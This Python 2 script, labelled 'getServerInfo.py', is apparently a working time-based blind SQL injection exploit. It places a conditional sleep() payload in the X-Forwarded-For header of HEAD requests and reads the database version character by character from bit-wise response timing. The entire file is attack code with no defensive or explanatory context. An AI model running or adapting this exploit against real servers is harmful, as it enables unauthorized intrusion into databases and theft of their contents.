import socket, sys, re, time

def usage():
    print "How to use: python getServerInfo.py <hostname> <port> \r\nPort in range(1,65535)\r\n"
    return

host = str(sys.argv[1])
port = int(sys.argv[2])
_c = ""
_result = []
_output = ""
vp = 1
v = " "

if type(port) is int and 0 < port and port <= 65535 and socket.inet_aton(host):
    while True:
        for i in range (0,8):
            try:
                    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    sock.connect((host,port))

                    sql = "if(ascii((substring((select version()),%d,1)))&POW(2,%d),sleep(0.5),0);#" %(vp,i)                   
                    httpFormat = "HEAD / HTTP/1.1\r\nHOST: %s\r\nX-Forwarded-For: juan_' or %s\r\nConnection: close\r\n\r\n " %(host,sql)

                    sock.send(httpFormat)
                    _sendTime = time.time()

                    rd = sock.recv(2048)
                    _recvTime = time.time()
                    
                    _cTime = _recvTime - _sendTime                   
                                     
                    if ( _cTime < 0.5):
                        _c += "0"
                    else:
                        _c += "1"                        
    
            except socket.error as serr:
                    rs = re.search(r'refused', str(serr))
                    if rs:
                            print serr
                    else:
                            usage()
            
        v = _c[::-1]
        print "[DEBUG %d]" %(vp) + chr(int(v,2))  
        
        if ( v != "00000000"):
            _result.append(v)
            _c = "" 
            vp += 1
        else:
            break
        
    for i in _result:
        _output += chr(int(i,2))

    print _output

